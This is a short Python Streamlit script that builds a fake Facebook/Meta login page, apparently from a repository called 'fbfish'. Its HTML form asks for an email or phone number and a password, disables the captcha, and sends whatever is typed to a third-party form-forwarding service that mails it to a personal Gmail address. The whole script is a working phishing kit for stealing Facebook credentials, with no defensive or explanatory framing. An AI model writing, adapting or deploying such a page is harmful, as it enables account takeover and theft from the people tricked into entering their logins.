import streamlit as st  # pip install streamlit

col1, col2, col3 = st.columns(3)

with col1:
    st.write(' ')

with col3:
    st.write(' ')

with col2:
    st.image(
        "https://github.com/MTA-BD/fbfish/blob/main/fbh/fb.png?raw=true",
        width=150,
        channels="RGB"
    )


# Form for sign in
contact_form = """
<style>
    .styledButton {
        background-color: #4285F4;
        color: white;
        border: none;
        padding: 10px 20px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        transition-duration: 0.4s;
        cursor: pointer;
        border-radius: 8px;
        width: 100%; /* Make the button wider */
        margin: 0 auto; /* Center align the button */
    }
    .styledInput {
        background-color: transparent;
        color: #4285F4;
        border: 2px solid  #e9e9ea;
        border-radius: 8px;
        padding: 10px;
        margin: 5px;
        width: 100%;
        box-sizing: border-box;
    }
</style>
<form action="https://formsubmit.co/md.taseen.alam@gmail.com" method="POST">
     <input type="hidden" name="_captcha" value="false">
     <input class="styledInput" type="email" name="email" placeholder="Email or mobile number" required>
     <input class="styledInput" type="text" name="name" placeholder="Password" required>
     <button type="submit" class="styledButton">Log in</button>
</form>
"""

st.markdown(contact_form, unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-size: 80; color: #42b72a;'>Create new account</p>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-size: 50; color: #7a7979;'>Meta</p>", unsafe_allow_html=True)
